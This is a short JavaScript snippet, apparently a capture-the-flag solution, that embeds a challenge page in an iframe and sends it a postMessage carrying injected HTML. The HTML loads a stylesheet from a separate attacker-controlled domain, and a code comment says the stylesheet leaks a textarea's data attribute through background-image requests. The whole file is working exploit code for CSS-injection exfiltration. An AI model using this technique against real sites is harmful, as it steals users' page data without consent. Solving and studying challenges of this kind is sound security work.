let target = document.createElement("iframe");
target.src = "https://chall1.jsapi.tech/?enableapi=true&recv=https://ctf0.jsapi.tech";
document.body.appendChild(target);

// inject stylesheet. The stylesheet will check the data-last attribute of the textarea and will load a background-image which contains the matched start of the attribute's value'
window.setTimeout(() => {
    let data = 'NOTE_APP_SET_REQUEST <div><link rel="stylesheet" href="https://ctf0.jsapi.tech/style.css"></div>';
    target.contentWindow.postMessage(data, "*");
}, 1000);
